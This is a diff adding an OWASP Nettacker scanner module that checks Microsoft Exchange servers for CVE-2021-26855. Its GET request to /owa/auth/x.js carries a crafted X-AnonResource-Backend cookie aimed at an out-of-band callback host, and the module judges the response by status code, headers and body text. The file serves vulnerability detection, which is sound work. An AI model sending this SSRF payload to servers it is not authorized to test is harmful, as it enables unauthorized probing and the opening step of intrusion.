@@ -1,0 +1,52 @@
+info:
+  name: msexchange_cve_2021_26855_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description:
+  reference:
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - msexchange
+    - cve
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 10
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+          Cookie: "X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/owa/auth/x.js"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: 500|503
+              reverse: false
+            headers:
+              x-calculatedbetarget:
+                regex: localhost
+                reverse: false
+            content:
+              regex: NegotiateSecurityContext
+              reverse: false
